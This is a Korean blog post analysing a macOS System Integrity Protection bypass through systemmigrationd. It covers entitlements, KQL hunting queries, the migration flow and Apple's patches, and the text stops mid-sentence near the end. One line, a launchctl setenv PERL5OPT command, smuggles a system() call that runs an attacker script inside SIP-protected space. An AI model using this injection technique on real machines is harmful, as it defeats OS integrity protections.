&#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; SIP &#xD65C;&#xC131; &#xC0C1;&#xD0DC;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACE0; &#xC2F6;&#xB2E4;&#xBA74; &#xC544;&#xB798; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs bash">$ csrutil statusSystem Integrity Protection status: enabled.</code></pre><ul><li>enabled: SIP&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xACE0;, &#xAE30;&#xBCF8; &#xBCF4;&#xD638;&#xAC00; &#xC801;&#xC6A9; &#xC911;</li><li>disabled: SIP&#xAC00; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC74C;</li></ul><p>intel &#xAE30;&#xBC18; Mac&#xC5D0;&#xC11C;&#xB294; SIP &#xC124;&#xC815;&#xC774; NVRAM &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xBBC0;&#xB85C;, &#xC544;&#xB798; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">$ nvram csr-active-configcsr-active-config  w%00%00%00</code></pre><p>&#xC774; &#xAC12;&#xC740; <strong>16&#xC9C4;&#xC218; &#xBE44;&#xD2B8;&#xD50C;&#xB798;&#xADF8;</strong>&#xB85C; SIP&#xC758; &#xC5B4;&#xB5A4; &#xAE30;&#xB2A5;&#xC774; &#xAEBC;&#xC838; &#xC788;&#xB294;&#xC9C0; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; 0x77&#xC774;&#xBA74; &#xC5EC;&#xB7EC; SIP &#xBCF4;&#xD638; &#xAE30;&#xB2A5;&#xC774; &#xD574;&#xC81C;&#xB41C; &#xC0C1;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;. Apple Silicon Mac&#xC5D0;&#xC11C;&#xB294; lp-sip0&#xC744; Device Tree&#xC5D0;&#xC11C; &#xC77D;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC704; &#xBA85;&#xB839;&#xC5B4;&#xB85C;&#xB294; &#xD655;&#xC778;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="SIP-Bypass-&#xC608;&#xC81C;"><a href="#SIP-Bypass-&#xC608;&#xC81C;" class="headerlink" title="SIP Bypass &#xC608;&#xC81C;"></a>SIP Bypass &#xC608;&#xC81C;</h2><p><code>com.apple.rootless.install.heritable</code> &#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294; &#x2018;drop_sip&#x2019; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xC5EC; &#xC5B4;&#xB5BB;&#xAC8C; SIP&#xB97C; &#xC6B0;&#xD68C;&#xD588;&#xB294;&#xC9C0; &#xC0B4;&#xD3B4;&#xBCF4;&#xB824; &#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs bash">DeviceProcessEvents| <span class="hljs-built_in">where</span> FileName =~ <span class="hljs-string">&quot;drop_sip&quot;</span>| project InitiatingProcessFileName, ProcessCommandLine, SHA256</code></pre><p>drop_sip&#xB294; Apple&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xC11C;&#xBA85;&#xD55C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_ko/image1.png" alt="image.png"></p><p>&#xC774; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; <code>/System/Library/PrivateFrameworks/SystemMigrationUtils.framework/Resources/Tools/drop_sip</code> &#xACBD;&#xB85C;&#xC5D0; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC11C;&#xBA85;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; <strong>csops()&#xB97C; &#xC0AC;&#xC6A9;&#xD574; SIP &#xAD00;&#xB828; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC124;&#xC815;&#xD558;&#xACE0; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC218;&#xD589;</strong>&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_ko/image2.png" alt="image.png"></p><p>.csops &#xC2DC;&#xC2A4;&#xD15C; &#xD638;&#xCD9C;&#xB85C; &#xC778;&#xD55C; <code>p_csflags</code> &#xBA64;&#xBC84; &#xC218;&#xC815;&#xC744; &#xC218;&#xD589;&#xD558;&#xAC8C; &#xB418;&#xBA70; SIP&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_ko/image3.png" alt="image.png"></p><p>&#xC0C1;&#xC704; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; <code>systemmigrationd</code>&#xC600;&#xC73C;&#xBA70;, <strong>com.apple.rootless.install.heritable</strong> &#xB97C; &#xD1B5;&#xD574; SIP &#xC6B0;&#xD68C; &#xAD8C;&#xD55C;&#xC744; &#xD558;&#xC704; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xAC8C; &#xC0C1;&#xC18D;&#xD558;&#xACE0; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; drop_sip &#xBC0F; &#xD558;&#xC704; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB4E4;&#xC740; SIP&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB294; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs bash">DeviceProcessEvents| <span class="hljs-built_in">where</span> InitiatingProcessFileName =~ <span class="hljs-string">&quot;systemmigrationd&quot;</span>| summarize Hits=count(), Cmdline=any(ProcessCommandLine) by FileName</code></pre><p>&#xC774;&#xD6C4;&#xB85C; &#xC704; &#xCFFC;&#xB9AC;&#xB97C; &#xD1B5;&#xD574; systemmigrationd&#xC758; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xCD94;&#xC801;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Bash&#xC640; Perl &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130;&#xAC00;(/bin/bash, /usr/bin/perl)&#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xAC83;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774;&#xAC74; &#xC911;&#xC694;&#xD55C; &#xD78C;&#xD2B8;&#xC600;&#xB294;&#xB370;&#xC694;, &#xC65C;&#xB0D0;&#xD558;&#xBA74; <strong>&#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130;&#xB294; &#xD658;&#xACBD; &#xBCC0;&#xC218; &#xC870;&#xC791;&#xC744; &#xD1B5;&#xD574; &#xCF54;&#xB4DC; &#xC8FC;&#xC785;&#xC774; &#xAC00;&#xB2A5;</strong>&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th><strong>FileName</strong></th><th><strong>Hits</strong></th><th><strong>Cmdline</strong></th></tr></thead><tbody><tr><td>bash</td><td>498</td><td>/bin/bash /System/Library/&#x2026;/firstbootDirectoryServer</td></tr><tr><td>perl</td><td>171</td><td>/usr/bin/perl /usr/libexec/migrateLocalKDC &#x2026;</td></tr></tbody></table></div><p>Bash&#xC758; <code>BASH_ENV</code>&#xB098; Perl&#xC758; <code>PERL5OPT</code> &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xBA74;, &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC6D0;&#xD558;&#xB294; &#xC258; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_ko/img_BASH_ENV.jpg" alt="image.png"><br>BASH_ENV&#xB97C; &#xD65C;&#xC6A9;&#xD55C; &#xC6B0;&#xD68C; &#xC608;&#xC2DC;</p><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_ko/img_PERL5OPT_ENV.jpg" alt="image.png"></p><p>PERL5OPT&#xB97C; &#xD65C;&#xC6A9;&#xD55C; &#xC6B0;&#xD68C; &#xC608;&#xC2DC;</p><pre><code class="hljs bash">launchctl setenv PERL5OPT <span class="hljs-string">&apos;-Mwarnings;system(&quot;/private/tmp/migraine.sh&quot;)&apos;</span></code></pre><p>&#xC774;&#xC81C; &#xC704;&#xC640; &#xAC19;&#xC740; &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA74;, Perl&#xC774; &#xAE30;&#xB3D9;&#xB420; &#xB54C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC0BD;&#xC785;&#xD55C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;(/private/tmp/migraine.sh)&#xAC00; SIP &#xBCF4;&#xD638; &#xC601;&#xC5ED; &#xB0B4;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><hr><p>&#xC55E;&#xC11C; &#xC18C;&#xAC1C;&#xD55C; SIP &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>systemmigrationd</code>&#xB77C;&#xB294; &#xB370;&#xBAAC;&#xC758; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xACF5;&#xACA9; &#xC9C4;&#xC785;&#xC810;&#xC73C;&#xB85C; &#xC0BC;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xBB38;&#xC81C;&#xB294; <strong>&#xC774; &#xB370;&#xBAAC;&#xC774; &#xC791;&#xB3D9;&#xD558;&#xB824;&#xBA74; &#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158;&#xC774; &#xC2E4;&#xC81C;&#xB85C; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC778;&#xB370;&#xC694;</strong>. &#xAE30;&#xC874;&#xC758; &#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158;&#xC740; <strong>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC644;&#xC804;&#xD788; &#xB85C;&#xADF8;&#xC544;&#xC6C3;&#xD55C; &#xD6C4;</strong>&#xC5D0;&#xB9CC; &#xC9C4;&#xD589;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, <strong>&#xC6D0;&#xACA9; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC2E4;&#xC2DC;&#xAC04;&#xC73C;&#xB85C; &#xC870;&#xC791;&#xD558;&#xAC70;&#xB098; &#xC790;&#xB3D9;&#xD654;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6B4; &#xD2B9;&#xC9D5;</strong>&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158; &#xC804;&#xCCB4; &#xD750;&#xB984;&#xC744; &#xBD84;&#xC11D;&#xD574; <strong>&#xC790;&#xB3D9;&#xD654; &#xAC00;&#xB2A5;&#xD55C; &#xC6B0;&#xD68C; &#xC9C0;&#xC810;&#xC744; &#xCC3E;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</strong></p><h3 id="&#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158;-&#xC804;&#xCCB4;-&#xD750;&#xB984;-&#xC694;&#xC57D;"><a href="#&#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158;-&#xC804;&#xCCB4;-&#xD750;&#xB984;-&#xC694;&#xC57D;" class="headerlink" title="&#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158; &#xC804;&#xCCB4; &#xD750;&#xB984; &#xC694;&#xC57D;"></a>&#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158; &#xC804;&#xCCB4; &#xD750;&#xB984; &#xC694;&#xC57D;</h3><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_ko/flow.jpg" alt="image.png"></p><ol><li><strong>Migration Assistant</strong><br>&#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158; &#xB9C8;&#xBC95;&#xC0AC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAE30;&#xBCF8; &#xC571;&#xC785;&#xB2C8;&#xB2E4;.<br>&#x2192; &#xB85C;&#xADF8;&#xC544;&#xC6C3;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xBA70;, &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>SACLOStartLogoutWithOptions</code> &#xBA54;&#xC11C;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.<br>&#x2192; &#xC774; &#xC571;&#xC740; <code>com.apple.private.mbsystemadministration</code>&#xB77C;&#xB294; Entitlement&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><strong>MBSystemAdministration</strong><ul><li>Migration Assistant&#xC758; &#xC694;&#xCCAD;&#xC744; <strong>proxy</strong>&#xD558;&#xC5EC; <strong>Setup Assistant</strong>&#xB85C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. <code>_mbsetupuser</code>&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xBA70;, GUI &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</li><li>XPC&#xB97C; &#xD1B5;&#xD574; &#xD1B5;&#xC2E0;&#xD558;&#xBA70;, &#xC694;&#xCCAD;&#xC744; &#xAC80;&#xC99D;&#xD560; &#xB54C; Entitlement&#xAC00; &#xC5C6;&#xC73C;&#xBA74; <strong>&#xAC70;&#xBD80;</strong>&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>Setup Assistant</strong><ul><li>&#xC2E4;&#xC81C; &#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158; &#xB85C;&#xC9C1;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA70;, <code>systemmigrationd</code>&#xC640; &#xD1B5;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>com.apple.private.systemmigration.daemonclient</code> Entitlement&#xB97C; &#xC694;&#xAD6C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC694;&#xCCAD;&#xC740; <strong>XPC</strong>&#xB97C; &#xD1B5;&#xD574; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>systemmigrationd</strong><ul><li>&#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158; &#xC694;&#xCCAD;&#xC744; &#xC218;&#xC2E0;&#xD558;&#xACE0;, <strong>SystemMigration.framework</strong>&#xB97C; &#xD1B5;&#xD574; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li><li>/Library/SystemMigration/Queue &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158; &#xC694;&#xCCAD; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0;, &#xC774;&#xB97C; <strong>&#x201C;In-Flight&#x201D;</strong> &#xC0C1;&#xD0DC;&#xB85C; &#xBC14;&#xAFD4; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD544;&#xC694;&#xC5D0; &#xB530;&#xB77C; <strong>bash&#xB098; perl &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;</strong>&#xD558;&#xB294;&#xB370;, <code>&#xC774; &#xC810;&#xC774; &#xBC14;&#xB85C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD658;&#xACBD; &#xBCC0;&#xC218; &#xAE30;&#xBC18; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xB294; &#xC9C0;&#xC810;</code>&#xC785;&#xB2C8;&#xB2E4;.</li></ul></li></ol><p>&#xC0B4;&#xD3B4;&#xBCF8; &#xB300;&#xB85C;, &#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158; &#xACFC;&#xC815;&#xC5D0;&#xC11C; systemmigrationd&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>SystemMigration.framework</code>&#xC758; <code>SystemMigrationDaemon</code> &#xAC1D;&#xCCB4;&#xB97C; &#xD1B5;&#xD574; XPC &#xC694;&#xCCAD;&#xC744; &#xC218;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;.  </p><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_ko/image4.png" alt="image.png"></p><pre><code class="hljs bash">rax = [SystemMigrationDaemon sharedDaemon];[rax startListeningForConnections];</code></pre><p>&#xC774;&#xCC98;&#xB7FC; &#xB370;&#xBAAC;&#xC740; &#xC790;&#xCCB4; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xD1B5;&#xD574; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xC694;&#xCCAD;&#xC744; &#xC218;&#xC2E0;&#xD558;&#xACE0;, &#xADF8;&#xC5D0; &#xB530;&#xB77C; &#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;(bash/perl &#xB4F1;)&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Migration-Assistant-&#xD328;&#xCE58;-&#xC2DC;&#xB3C4;"><a href="#Migration-Assistant-&#xD328;&#xCE58;-&#xC2DC;&#xB3C4;" class="headerlink" title="Migration Assistant &#xD328;&#xCE58; &#xC2DC;&#xB3C4;"></a>Migration Assistant &#xD328;&#xCE58; &#xC2DC;&#xB3C4;</h3><p><img src="/2025/05/11/clalxk/MacOS_SIP-Bypass_ko/image5.png" alt="image.png"></p><p>SIP &#xC6B0;&#xD68C;&#xB97C; &#xC790;&#xB3D9;&#xD654;&#xD558;&#xAE30; &#xC704;&#xD574;, Microsoft&#xB294; &#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <strong>&#xB85C;&#xADF8;&#xC544;&#xC6C3;&#xC744; &#xC720;&#xB3C4;&#xD558;&#xB294; &#xD568;&#xC218;&#xC778;</strong> <code>SACLOStartLogoutWithOptions()</code>&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xB824; &#xC2DC;&#xB3C4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xD568;&#xC218;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xBA74; <strong>&#xC0AC;&#xC6A9;&#xC790; &#xB85C;&#xADF8;&#xC544;&#xC6C3; &#xC5C6;&#xC774; &#xB9C8;&#xC774;&#xADF8;&#xB808;&#xC774;&#xC158;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC744; &#xAC83;</strong>&#xC73C;&#xB85C; &#xAE30;&#xB300;&#xD588;&#xC9C0;&#xB9CC;, 3&#xAC00;&#xC9C0;&#xC758; &#xC774;&#xC720;&#xB85C; &#xC2E4;&#xD328;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC720;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><strong>&#xCF54;&#xB4DC; &#xC11C;&#xBA85; &#xC2E4;&#xD328; (codesign failure)</strong><br>macOS&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; &#xC11C;&#xBA85;&#xC744; &#xAC15;&#xB825;&#xD558;&#xAC8C; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;.<br>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC218;&#xC815;&#xD558;&#xB294; &#xC21C;&#xAC04; &#xC11C;&#xBA85;&#xC774; &#xAE68;&#xC9C0;&#xACE0; &#xC2E4;&#xD589; &#xC790;&#xCCB4;&#xAC00; &#xCC28;&#xB2E8;&#xB429;&#xB2C8;&#xB2E4;.</li><li><strong>PAC(Pointer Authentication Code) &#xBBF8;&#xAC80;&#xC99D; &#xBB38;&#xC81C;</strong><br>&#xCD5C;&#xC2E0; Apple Silicon(macOS arm64e)&#xC5D0;&#xC11C;&#xB294; <strong>PAC &#xAE30;&#xB2A5;&#xC774; &#xD65C;&#xC131;&#xD654;</strong>&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC11C;&#xBA85;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; <strong>PAC &#xAC80;&#xC99D;&#xC744; &#xD1B5;&#xACFC;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</strong></li><li><p><strong>&#xC5D4;&#xD0C0;&#xC774;&#xD2C0;&#xBA3C;&#xD2B8; &#xC0C1;&#xC2E4;</strong></p><p> Migration Assistant &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; <code>com.apple.private.mbsystemadministration</code> Entitlement&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC5B4;&#xC57C; <strong>MBSystemAdministration&#xC640;&#xC758; XPC &#xD1B5;&#xC2E0;&#xC774; &#xAC00;&#xB2A5;</strong>&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xCD94;&#xCD9C;&#xB7;&#xC218;&#xC815;&#xB7;&#xC7AC;&#xC870;&#xB9BD;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC774; Entitlement&#xAC00; <strong>&#xC190;&#xC2E4;&#xB418;&#xC5B4; &#xD1B5;&#xC2E0;&#xC774; &#xCC28;&#xB2E8;</strong>&#xB429;&#xB2C8;&#xB2E4;.</p></li></ol><p>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C;, &#xB2E8;&#xC21C;&#xD788; &#xB85C;&#xADF8;&#xC544;&#xC6C3; &#xCF54;&#xB4DC;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xAC70;&#xB098; Migration Assistant&#xB97C; &#xC218;&#xC815;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC740; &#xD604;&#xC2E4;&#xC801;&#xC73C;&#xB85C; &#xBD88;&#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC5BB;&#xC740; &#xAC83;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xCD94;&#xAC00; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; Setup Assistant&#xB97C; &#xC9C1;&#xC811; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC6B0;&#xD68C; &#xBC29;&#xBC95;(AppleScript, &#xD658;&#xACBD; &#xBCC0;&#xC218; &#xAE30;&#xBC18; &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xB4F1;&#xC744; &#xD65C;&#xC6A9;&#xD55C; &#xC790;&#xB3D9;&#xD654;)&#xC744; &#xC801;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74; &#xACF5;&#xACA9;&#xC790;&#xB294; &#x2018;&#xC2DC;&#xC2A4;&#xD15C; &#xB85C;&#xADF8;&#xC544;&#xC6C3;, &#xC0AC;&#xC6A9;&#xC790; &#xAC1C;&#xC785;&#x2019; &#xC5C6;&#xC774; systemmigrationd &#xB370;&#xBAAC;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xACE0;, bash/perl &#xC2E4;&#xD589; &#xC2DC;&#xC810;&#xC5D0; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><h2 id="Apple&#xC758;-&#xB300;&#xC751;"><a href="#Apple&#xC758;-&#xB300;&#xC751;" class="headerlink" title="Apple&#xC758; &#xB300;&#xC751;"></a>Apple&#xC758; &#xB300;&#xC751;</h2><p>&#xC704; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD655;&#xC778;&#xD55C; Apple&#xC740; &#xC57D; 2&#xAC00;&#xC9C0; &#xC815;&#xB3C4;&#xC758; &#xD328;&#xCE58;&#xB97C; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ol><li><p><strong>launchd&#xC5D0; &#xD658;&#xACBD; &#xBCC0;&#xC218; &#xC804;&#xB2EC; &#xC790;&#xCCB4;&#xB97C; &#xAE08;&#xC9C0;</strong></p><ul><li><p>&#xAE30;&#xC874;&#xC5D0;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xAC00; launchctl setenv &#xBA85;&#xB839;&#xC744; &#xC0AC;&#xC6A9;&#xD574; BASH_ENV, PERL5OPT &#xB4F1; &#xD2B9;&#xC815; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xC124;&#xC815;&#xD55C; &#xB4A4;, systemmigrationd&#xC758; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; Apple&#xC740; <strong>launchd&#xAC00; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xBB34;&#xC2DC;&#xD558;&#xB3C4;&#xB85D; &#xB0B4;&#xBD80; &#xB85C;&#xC9C1;&#xC744; &#xBCC0;&#xACBD;</strong>&#xD558;&#xC5EC;, &#xC544;&#xC608; &#xC774; &#xBC29;&#xBC95; &#xC804;&#xCCB4;&#xB97C; &#xCC28;&#xB2E8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">launchctl setenv WHATEVER blah<span class="hljs-comment"># &#xC624;&#xB958; &#xBC1C;&#xC0DD;:</span>Could not <span class="hljs-built_in">set</span> environment: 150: Operation not permitted <span class="hljs-keyword">while</span> System Integrity Protection is engaged</code></pre></li></ul></li><li><p><strong>drop_sip &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC0AC;&#xC804;&#xC5D0; SIP &#xC6B0;&#xD68C; capability&#xB97C; &#xC81C;&#xAC70;</strong></p></li></ol><h2 id="&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;"></a>&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;</h2><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; SIP&#xC758; &#xAC1C;&#xB150;&#xBD80;&#xD130; Entitlement, &#xC6B0;&#xD68C; &#xBC0F; &#xD65C;&#xC6A9; &#xBC29;&#xC548;, &#xD328;&#xCE58; 